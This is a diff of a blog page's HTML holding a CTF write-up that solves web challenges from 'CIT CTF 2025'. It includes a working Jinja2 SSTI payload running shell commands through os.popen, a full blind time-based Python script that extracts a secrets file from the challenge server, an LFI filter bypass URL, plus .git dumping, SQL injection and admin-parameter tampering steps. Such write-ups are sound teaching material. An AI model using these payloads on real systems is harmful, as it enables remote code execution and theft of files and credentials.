@@ -1,117 +1,495 @@
-<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>[CIT CTF 2025] Solving all Web challenges | @MindPatch</title><meta name=keywords content="CTF,web security,SSTI,LFI,SQL injection,git enumeration,flask"><meta name=description content="Hello, I joined the CTF for fun during the weekend.
-I focused on web challenges and completed all challenges in this category. The challenges were straightforward and made for a fun weekend.
-Mr. Chatbot
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
 
-The application shows a welcome page asking for your name, then puts you in a chat with a bot. The goal was to get the Flag from the bot. This wasn&rsquo;t an LLM attack — responses came from JavaScript files."><meta name=author content="MindPatch"><link rel=canonical href=https://www.mindpatch.net/posts/2025-04-28-cit-ctf/><link crossorigin=anonymous href=/assets/css/stylesheet.8fe10233a706bc87f2e08b3cf97b8bd4c0a80f10675a143675d59212121037c0.css integrity="sha256-j+ECM6cGvIfy4Is8+XuL1MCoDxBnWhQ2ddWSEhIQN8A=" rel="preload stylesheet" as=style><link rel=icon href=https://www.mindpatch.net/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://www.mindpatch.net/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://www.mindpatch.net/favicon-32x32.png><link rel=apple-touch-icon href=https://www.mindpatch.net/apple-touch-icon.png><link rel=mask-icon href=https://www.mindpatch.net/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://www.mindpatch.net/posts/2025-04-28-cit-ctf/><noscript><style>#theme-toggle,.top-link{display:none}</style></noscript><meta property="og:url" content="https://www.mindpatch.net/posts/2025-04-28-cit-ctf/"><meta property="og:site_name" content="@MindPatch"><meta property="og:title" content="[CIT CTF 2025] Solving all Web challenges"><meta property="og:description" content="Hello, I joined the CTF for fun during the weekend.
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="MindPatch">
+<meta name="description" content="Hello, I joined the CTF for fun during the weekend.
 I focused on web challenges and completed all challenges in this category. The challenges were straightforward and made for a fun weekend.
-Mr. Chatbot The application shows a welcome page asking for your name, then puts you in a chat with a bot. The goal was to get the Flag from the bot. This wasn’t an LLM attack — responses came from JavaScript files."><meta property="og:locale" content="en-us"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-04-28T00:00:00+00:00"><meta property="article:modified_time" content="2025-04-28T00:00:00+00:00"><meta property="article:tag" content="CTF"><meta property="article:tag" content="Web Security"><meta property="article:tag" content="SSTI"><meta property="article:tag" content="LFI"><meta property="article:tag" content="SQL Injection"><meta property="article:tag" content="Git Enumeration"><meta property="og:image" content="https://www.mindpatch.net/og-image.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://www.mindpatch.net/og-image.png"><meta name=twitter:title content="[CIT CTF 2025] Solving all Web challenges"><meta name=twitter:description content="Hello, I joined the CTF for fun during the weekend.
-I focused on web challenges and completed all challenges in this category. The challenges were straightforward and made for a fun weekend.
-Mr. Chatbot
+Mr. Chatbot The application shows a welcome page asking for your name, then puts you in a chat with a bot. The goal was to get the Flag from the bot. This wasn&rsquo;t an LLM attack — responses came from JavaScript files.
+" />
+<meta name="keywords" content="[cybersecurity penetration testing bug bounty security research vulnerability assessment ethical hacking security automation CTF competitions offensive security mindpatch], CTF, web security, SSTI, LFI, SQL injection, git enumeration, flask" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://www.mindpatch.net/posts/2025-04-28-cit-ctf/" />
 
-The application shows a welcome page asking for your name, then puts you in a chat with a bot. The goal was to get the Flag from the bot. This wasn&rsquo;t an LLM attack — responses came from JavaScript files."><meta name=twitter:site content="@https://twitter.com/mindpatch"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://www.mindpatch.net/posts/"},{"@type":"ListItem","position":2,"name":"[CIT CTF 2025] Solving all Web challenges","item":"https://www.mindpatch.net/posts/2025-04-28-cit-ctf/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"[CIT CTF 2025] Solving all Web challenges","name":"[CIT CTF 2025] Solving all Web challenges","description":"Hello, I joined the CTF for fun during the weekend.\nI focused on web challenges and completed all challenges in this category. The challenges were straightforward and made for a fun weekend.\nMr. Chatbot The application shows a welcome page asking for your name, then puts you in a chat with a bot. The goal was to get the Flag from the bot. This wasn\u0026rsquo;t an LLM attack — responses came from JavaScript files.\n","keywords":["CTF","web security","SSTI","LFI","SQL injection","git enumeration","flask"],"articleBody":"Hello, I joined the CTF for fun during the weekend.\nI focused on web challenges and completed all challenges in this category. The challenges were straightforward and made for a fun weekend.\nMr. Chatbot The application shows a welcome page asking for your name, then puts you in a chat with a bot. The goal was to get the Flag from the bot. This wasn’t an LLM attack — responses came from JavaScript files.\nAfter entering a name, you get a session value that can be decoded with flask-unsign:\n$ flask-unsign --unsign --cookie \"eyJhZG1pbiI6IjAiLCJuYW1lIjoiaGFja2VyIn0.aA8u-Q.GRwPzCvfn4k_zUDDzo_XL83fKJk\" --secret=\"9f3IC3uj9^zZ\" [*] Session decodes to: {'admin': '0', 'name': 'hacker'} After trying injections with no luck, I did parameter fuzzing and found the admin=1 parameter. This revealed new session data:\n$ flask-unsign --unsign --cookie \".eJwdzE0LgjAAxvHvsksEHVoJUdEpe7M2C2S63cyJTacIFprRd--x2397ftuHxLo0FVkRSiakissUmT6TOm6aVo_G63GGO43tZTSmy0xM5XvZyoj3enarzkFjzqF-3ENRSCNz1heL6PiwzHaO7LMaXfJ956hwn6QHUVzQfqDQrL3SbjpYTmFzL0ndguKc822NfUe5Haz2omPWMfpvGJsrtAoEzMmBNwpOuXZ4M4d1fAEb_v-be4b1ftBsyPcHZ6hN0g.aAwwvA.ouiTuVJ131_fQmyqYgewMTM-ZlM\" --secret=\"9f3IC3uj9^zZ\" [*] Session decodes to: {'admin': '1', 'name': \"hacker\", 'uid': 'L2V0Yy9wYXNzd2QnKTsiKWdhbWVkYiYjMzk7XHhlMlx4YzgpXHhmNFx4ZWFceGVkLFx4OTZceGMwP1x0XHhlN1x4YjJceDk1XHhjNCpceGE1Nlx4OTdJXHgxM1x4OTdceDljZ1x4ZTVceGI4XHhiZlx4ZDlceGE3XHg4OVx4OWJceDk3JiMzOTs='} As you see there’s a new variable (UID), I tried doing some injections like SSTI and got it :)\nWell The idea now to get secrets.txt file blindly, I wrote a script that uses head command if char is valid then sleep 5 seconds\nimport requests import string import time CHARS = string.printable FOUND = \"\" POSITION = len(FOUND) + 1 def make_payload(position, the_char): # Use a simple command to compare single character cmd = f'[ \"$(head -c {position} secrets.txt | tail -c 1)\" = \"{the_char}\" ] \u0026\u0026 sleep 5' payload = \"{{ self.__init__.__globals__.__builtins__.__import__('os').popen('\"+cmd+\"').read() }}\" return payload def exploit(): global FOUND, POSITION # Continue until we've found enough characters or need to stop max_positions = 100 # Set a reasonable limit consecutive_spaces = 0 # Track consecutive spaces to detect end of file while POSITION \u003c= max_positions and consecutive_spaces \u003c 5: # Stop after 5 consecutive spaces found_char = False for ch in CHARS: if ch in ['\"', '\\\\', '`', '$', '\u0026', '|', ';', '\\n', '\\r']: # Skip problematic chars continue print(f\"Position {POSITION}, trying character: {ch}\") start_time = time.time() try: r = requests.post( \"http://23.179.17.40:58005/\", allow_redirects=False, data={\"name\": make_payload(POSITION, ch), \"admin\": \"1\"}, proxies={\"http\": \"http://localhost:8080\"}, timeout=10 ) elapsed_time = time.time() - start_time if elapsed_time \u003e= 4.5: # Slightly lower threshold to account for network variability FOUND += ch found_char = True # Reset consecutive spaces counter if we found a non-space if ch != ' ': consecutive_spaces = 0 else: consecutive_spaces += 1 print(f\"Found character at position {POSITION}: {ch}\") print(f\"Current secret: {FOUND}\") break except requests.exceptions.Timeout: # If timeout occurs, the character matched FOUND += ch found_char = True # Reset consecutive spaces counter if we found a non-space if ch != ' ': consecutive_spaces = 0 else: consecutive_spaces += 1 print(f\"Found character at position {POSITION} (timeout): {ch}\") print(f\"Current secret: {FOUND}\") break except Exception as e: print(f\"Error with character {ch} at position {POSITION}: {e}\") if not found_char: FOUND += \" \" consecutive_spaces += 1 print(f\"No character found at position {POSITION}, adding space and continuing\") print(f\"Current secret: {FOUND}\") print(f\"Consecutive spaces: {consecutive_spaces}\") POSITION += 1 time.sleep(1) def main(): print(f\"Starting blind exploitation from existing credentials: {FOUND}\") print(f\"Starting at position: {POSITION}\") exploit() print(f\"Final extracted secret: {FOUND}\") if __name__ == \"__main__\": main() And after running it got the flag :)\n$ python exp.py admin:9f3IC3uj9^zZ CIT{18a7fbedb4f3548f} How I Parsed your JSON This challenge reads JSON files locally and provides a SQL-like syntax to extract data. You can add * to the query to extract all columns.\nThe useful finding was converting the container parameter into a list with ?container[]=. This showed a debug page with source code.\nThe code simply removes ../ and file extensions from the container name to prevent LFI. This can be bypassed with ..//file.txt.txt.\n/select?record=*\u0026container=../../../..//app//secrets.txt.txt Commit \u0026 Order: Version Control Unit This challenge was straightforward. I discovered an exposed /.git directory on the server and dumped the repository using the git-dump tool.\nAfter examining the commit history, I found older commits that contained the source code with hardcoded admin credentials. This is a common security mistake where developers remove sensitive information in later commits but forget that the data remains accessible in the Git history.\nThe steps to solve were:\nIdentify the exposed Git repository at /.git Download the repository using git-dump Review commit history with git log Check older commits with git show [commit-hash] Find the source code file containing the hardcoded admin password in admin.php Use the credentials to access the admin panel and retrieve the flag Breaking Authentication This challenge featured a straightforward SQL injection vulnerability in the login page.\nSteps to solve:\nAccessed the database and dumped its contents Found the flag stored in the ‘secrets’ table Classic example of an unsanitized input field allowing SQL injection to compromise a web application’s authentication mechanism.\nKeeping Up with the Credentials This challenge required first solving another challenge to obtain valid username and password credentials.\nSteps to solve:\nUsed credentials obtained from the previous challenge to log in After login, got redirected to /debug.php which was an empty page Noticed that accessing /admin.php directly would automatically log you out Modified the login request to include the parameter admin=true using POST method Successfully redirected to /admin.php with admin privileges Retrieved the flag from the admin page Pretty Simple :v\n","wordCount":"843","inLanguage":"en","image":"https://www.mindpatch.net/og-image.png","datePublished":"2025-04-28T00:00:00Z","dateModified":"2025-04-28T00:00:00Z","author":{"@type":"Person","name":"MindPatch"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://www.mindpatch.net/posts/2025-04-28-cit-ctf/"},"publisher":{"@type":"Organization","name":"@MindPatch","logo":{"@type":"ImageObject","url":"https://www.mindpatch.net/favicon.ico"}}}</script></head><body class=dark id=top><script>localStorage.getItem("pref-theme")==="light"&&document.body.classList.remove("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://www.mindpatch.net/ accesskey=h title="@MindPatch (Alt + H)">@MindPatch</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
-<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
-<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://www.mindpatch.net/about title=About><span>About</span></a></li><li><a href=https://www.mindpatch.net/projects/ title=Projects><span>Projects</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">[CIT CTF 2025] Solving all Web challenges</h1><div class=post-meta><span title='2025-04-28 00:00:00 +0000 UTC'>April 28, 2025</span>&nbsp;·&nbsp;4 min&nbsp;·&nbsp;MindPatch</div></header><div class=post-content><p>Hello, I joined the CTF for fun during the weekend.</p><p>I focused on web challenges and completed all challenges in this category. The challenges were straightforward and made for a fun weekend.</p><h2 id=mr-chatbot>Mr. Chatbot<a hidden class=anchor aria-hidden=true href=#mr-chatbot>#</a></h2><p><img alt="Mr. Chatbot Challenge" loading=lazy src=https://miro.medium.com/v2/resize:fit:952/1*kvW3lucpnNq6fTtQ9Y_BBA.png></p><p>The application shows a welcome page asking for your name, then puts you in a chat with a bot. The goal was to get the Flag from the bot. This wasn&rsquo;t an LLM attack — responses came from JavaScript files.</p><p><img alt="Chat Interface" loading=lazy src=https://miro.medium.com/v2/resize:fit:952/1*RXw88Zwtk6JNglc_pSVzTQ.png></p><p>After entering a name, you get a session value that can be decoded with flask-unsign:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ flask-unsign --unsign --cookie <span style=color:#e6db74>&#34;eyJhZG1pbiI6IjAiLCJuYW1lIjoiaGFja2VyIn0.aA8u-Q.GRwPzCvfn4k_zUDDzo_XL83fKJk&#34;</span> --secret<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;9f3IC3uj9^zZ&#34;</span>
-</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Session decodes to: <span style=color:#f92672>{</span><span style=color:#e6db74>&#39;admin&#39;</span>: <span style=color:#e6db74>&#39;0&#39;</span>, <span style=color:#e6db74>&#39;name&#39;</span>: <span style=color:#e6db74>&#39;hacker&#39;</span><span style=color:#f92672>}</span>
-</span></span></code></pre></div><p><img alt="Session Decoding" loading=lazy src=https://miro.medium.com/v2/resize:fit:952/1*lZwyPZ9_OqenlmQWuCAssg.png></p><p>After trying injections with no luck, I did parameter fuzzing and found the <code>admin=1</code> parameter. This revealed new session data:</p><p><img alt="Admin Parameter" loading=lazy src=https://miro.medium.com/v2/resize:fit:667/1*1TuqK6xE0XGYJz-DQD50oQ.png></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ flask-unsign --unsign --cookie <span style=color:#e6db74>&#34;.eJwdzE0LgjAAxvHvsksEHVoJUdEpe7M2C2S63cyJTacIFprRd--x2397ftuHxLo0FVkRSiakissUmT6TOm6aVo_G63GGO43tZTSmy0xM5XvZyoj3enarzkFjzqF-3ENRSCNz1heL6PiwzHaO7LMaXfJ956hwn6QHUVzQfqDQrL3SbjpYTmFzL0ndguKc822NfUe5Haz2omPWMfpvGJsrtAoEzMmBNwpOuXZ4M4d1fAEb_v-be4b1ftBsyPcHZ6hN0g.aAwwvA.ouiTuVJ131_fQmyqYgewMTM-ZlM&#34;</span> --secret<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;9f3IC3uj9^zZ&#34;</span>
-</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Session decodes to: <span style=color:#f92672>{</span><span style=color:#e6db74>&#39;admin&#39;</span>: <span style=color:#e6db74>&#39;1&#39;</span>, <span style=color:#e6db74>&#39;name&#39;</span>: <span style=color:#e6db74>&#34;hacker&#34;</span>, <span style=color:#e6db74>&#39;uid&#39;</span>: <span style=color:#e6db74>&#39;L2V0Yy9wYXNzd2QnKTsiKWdhbWVkYiYjMzk7XHhlMlx4YzgpXHhmNFx4ZWFceGVkLFx4OTZceGMwP1x0XHhlN1x4YjJceDk1XHhjNCpceGE1Nlx4OTdJXHgxM1x4OTdceDljZ1x4ZTVceGI4XHhiZlx4ZDlceGE3XHg4OVx4OWJceDk3JiMzOTs=&#39;</span><span style=color:#f92672>}</span>
-</span></span></code></pre></div><p>As you see there&rsquo;s a new variable (<strong>UID</strong>), I tried doing some injections like SSTI and got it :)</p><p><img alt="SSTI Success" loading=lazy src=https://miro.medium.com/v2/resize:fit:667/1*GdcyUtROwNfXlDF7_ViIVw.png></p><p>Well The idea now to get <strong>secrets.txt</strong> file blindly, I wrote a script that uses <strong>head</strong> command if char is valid then sleep 5 seconds</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> requests
-</span></span><span style=display:flex><span><span style=color:#f92672>import</span> string
-</span></span><span style=display:flex><span><span style=color:#f92672>import</span> time
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>CHARS <span style=color:#f92672>=</span> string<span style=color:#f92672>.</span>printable
-</span></span><span style=display:flex><span>FOUND <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>
-</span></span><span style=display:flex><span>POSITION <span style=color:#f92672>=</span> len(FOUND) <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>make_payload</span>(position, the_char):
-</span></span><span style=display:flex><span>    <span style=color:#75715e># Use a simple command to compare single character</span>
-</span></span><span style=display:flex><span>    cmd <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;[ &#34;$(head -c </span><span style=color:#e6db74>{</span>position<span style=color:#e6db74>}</span><span style=color:#e6db74> secrets.txt | tail -c 1)&#34; = &#34;</span><span style=color:#e6db74>{</span>the_char<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34; ] &amp;&amp; sleep 5&#39;</span>
-</span></span><span style=display:flex><span>    payload <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;{{ self.__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;&#34;</span><span style=color:#f92672>+</span>cmd<span style=color:#f92672>+</span><span style=color:#e6db74>&#34;&#39;).read() }}&#34;</span>
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> payload
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>exploit</span>():
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>global</span> FOUND, POSITION
-</span></span><span style=display:flex><span>    
-</span></span><span style=display:flex><span>    <span style=color:#75715e># Continue until we&#39;ve found enough characters or need to stop</span>
-</span></span><span style=display:flex><span>    max_positions <span style=color:#f92672>=</span> <span style=color:#ae81ff>100</span>  <span style=color:#75715e># Set a reasonable limit</span>
-</span></span><span style=display:flex><span>    consecutive_spaces <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>  <span style=color:#75715e># Track consecutive spaces to detect end of file</span>
-</span></span><span style=display:flex><span>    
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> POSITION <span style=color:#f92672>&lt;=</span> max_positions <span style=color:#f92672>and</span> consecutive_spaces <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>5</span>:  <span style=color:#75715e># Stop after 5 consecutive spaces</span>
-</span></span><span style=display:flex><span>        found_char <span style=color:#f92672>=</span> <span style=color:#66d9ef>False</span>
-</span></span><span style=display:flex><span>        
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> ch <span style=color:#f92672>in</span> CHARS:
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> ch <span style=color:#f92672>in</span> [<span style=color:#e6db74>&#39;&#34;&#39;</span>, <span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#39;</span>, <span style=color:#e6db74>&#39;`&#39;</span>, <span style=color:#e6db74>&#39;$&#39;</span>, <span style=color:#e6db74>&#39;&amp;&#39;</span>, <span style=color:#e6db74>&#39;|&#39;</span>, <span style=color:#e6db74>&#39;;&#39;</span>, <span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>, <span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\r</span><span style=color:#e6db74>&#39;</span>]:  <span style=color:#75715e># Skip problematic chars</span>
-</span></span><span style=display:flex><span>                <span style=color:#66d9ef>continue</span>
-</span></span><span style=display:flex><span>                
-</span></span><span style=display:flex><span>            print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Position </span><span style=color:#e6db74>{</span>POSITION<span style=color:#e6db74>}</span><span style=color:#e6db74>, trying character: </span><span style=color:#e6db74>{</span>ch<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
-</span></span><span style=display:flex><span>            start_time <span style=color:#f92672>=</span> time<span style=color:#f92672>.</span>time()
-</span></span><span style=display:flex><span>            
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>try</span>:
-</span></span><span style=display:flex><span>                r <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>post(
-</span></span><span style=display:flex><span>                    <span style=color:#e6db74>&#34;http://23.179.17.40:58005/&#34;</span>, 
-</span></span><span style=display:flex><span>                    allow_redirects<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>, 
-</span></span><span style=display:flex><span>                    data<span style=color:#f92672>=</span>{<span style=color:#e6db74>&#34;name&#34;</span>: make_payload(POSITION, ch), <span style=color:#e6db74>&#34;admin&#34;</span>: <span style=color:#e6db74>&#34;1&#34;</span>},
-</span></span><span style=display:flex><span>                    proxies<span style=color:#f92672>=</span>{<span style=color:#e6db74>&#34;http&#34;</span>: <span style=color:#e6db74>&#34;http://localhost:8080&#34;</span>},
-</span></span><span style=display:flex><span>                    timeout<span style=color:#f92672>=</span><span style=color:#ae81ff>10</span>
-</span></span><span style=display:flex><span>                )
-</span></span><span style=display:flex><span>                
-</span></span><span style=display:flex><span>                elapsed_time <span style=color:#f92672>=</span> time<span style=color:#f92672>.</span>time() <span style=color:#f92672>-</span> start_time
-</span></span><span style=display:flex><span>                
-</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> elapsed_time <span style=color:#f92672>&gt;=</span> <span style=color:#ae81ff>4.5</span>:  <span style=color:#75715e># Slightly lower threshold to account for network variability</span>
-</span></span><span style=display:flex><span>                    FOUND <span style=color:#f92672>+=</span> ch
-</span></span><span style=display:flex><span>                    found_char <span style=color:#f92672>=</span> <span style=color:#66d9ef>True</span>
-</span></span><span style=display:flex><span>                    
-</span></span><span style=display:flex><span>                    <span style=color:#75715e># Reset consecutive spaces counter if we found a non-space</span>
-</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>if</span> ch <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#39; &#39;</span>:
-</span></span><span style=display:flex><span>                        consecutive_spaces <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
-</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>else</span>:
-</span></span><span style=display:flex><span>                        consecutive_spaces <span style=color:#f92672>+=</span> <span style=color:#ae81ff>1</span>
-</span></span><span style=display:flex><span>                        
-</span></span><span style=display:flex><span>                    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Found character at position </span><span style=color:#e6db74>{</span>POSITION<span style=color:#e6db74>}</span><span style=color:#e6db74>: </span><span style=color:#e6db74>{</span>ch<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
-</span></span><span style=display:flex><span>                    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Current secret: </span><span style=color:#e6db74>{</span>FOUND<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
-</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>break</span>
-</span></span><span style=display:flex><span>                    
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>except</span> requests<span style=color:#f92672>.</span>exceptions<span style=color:#f92672>.</span>Timeout:
-</span></span><span style=display:flex><span>                <span style=color:#75715e># If timeout occurs, the character matched</span>
-</span></span><span style=display:flex><span>                FOUND <span style=color:#f92672>+=</span> ch
-</span></span><span style=display:flex><span>                found_char <span style=color:#f92672>=</span> <span style=color:#66d9ef>True</span>
-</span></span><span style=display:flex><span>                
-</span></span><span style=display:flex><span>                <span style=color:#75715e># Reset consecutive spaces counter if we found a non-space</span>
-</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> ch <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#39; &#39;</span>:
-</span></span><span style=display:flex><span>                    consecutive_spaces <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
-</span></span><span style=display:flex><span>                <span style=color:#66d9ef>else</span>:
-</span></span><span style=display:flex><span>                    consecutive_spaces <span style=color:#f92672>+=</span> <span style=color:#ae81ff>1</span>
-</span></span><span style=display:flex><span>                    
-</span></span><span style=display:flex><span>                print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Found character at position </span><span style=color:#e6db74>{</span>POSITION<span style=color:#e6db74>}</span><span style=color:#e6db74> (timeout): </span><span style=color:#e6db74>{</span>ch<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
-</span></span><span style=display:flex><span>                print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Current secret: </span><span style=color:#e6db74>{</span>FOUND<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
-</span></span><span style=display:flex><span>                <span style=color:#66d9ef>break</span>
-</span></span><span style=display:flex><span>                
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>Exception</span> <span style=color:#66d9ef>as</span> e:
-</span></span><span style=display:flex><span>                print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Error with character </span><span style=color:#e6db74>{</span>ch<span style=color:#e6db74>}</span><span style=color:#e6db74> at position </span><span style=color:#e6db74>{</span>POSITION<span style=color:#e6db74>}</span><span style=color:#e6db74>: </span><span style=color:#e6db74>{</span>e<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
-</span></span><span style=display:flex><span>        
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> found_char:
-</span></span><span style=display:flex><span>            FOUND <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34; &#34;</span>
-</span></span><span style=display:flex><span>            consecutive_spaces <span style=color:#f92672>+=</span> <span style=color:#ae81ff>1</span>
-</span></span><span style=display:flex><span>            print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;No character found at position </span><span style=color:#e6db74>{</span>POSITION<span style=color:#e6db74>}</span><span style=color:#e6db74>, adding space and continuing&#34;</span>)
-</span></span><span style=display:flex><span>            print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Current secret: </span><span style=color:#e6db74>{</span>FOUND<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
-</span></span><span style=display:flex><span>            print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Consecutive spaces: </span><span style=color:#e6db74>{</span>consecutive_spaces<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
-</span></span><span style=display:flex><span>        
-</span></span><span style=display:flex><span>        POSITION <span style=color:#f92672>+=</span> <span style=color:#ae81ff>1</span>
-</span></span><span style=display:flex><span>        
-</span></span><span style=display:flex><span>        time<span style=color:#f92672>.</span>sleep(<span style=color:#ae81ff>1</span>)
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>main</span>():
-</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Starting blind exploitation from existing credentials: </span><span style=color:#e6db74>{</span>FOUND<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
-</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Starting at position: </span><span style=color:#e6db74>{</span>POSITION<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
-</span></span><span style=display:flex><span>    exploit()
-</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Final extracted secret: </span><span style=color:#e6db74>{</span>FOUND<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
-</span></span><span style=display:flex><span>    main()
-</span></span></code></pre></div><p>And after running it got the flag :)</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ python exp.py
-</span></span><span style=display:flex><span>admin:9f3IC3uj9^zZ  CIT<span style=color:#f92672>{</span>18a7fbedb4f3548f<span style=color:#f92672>}</span>
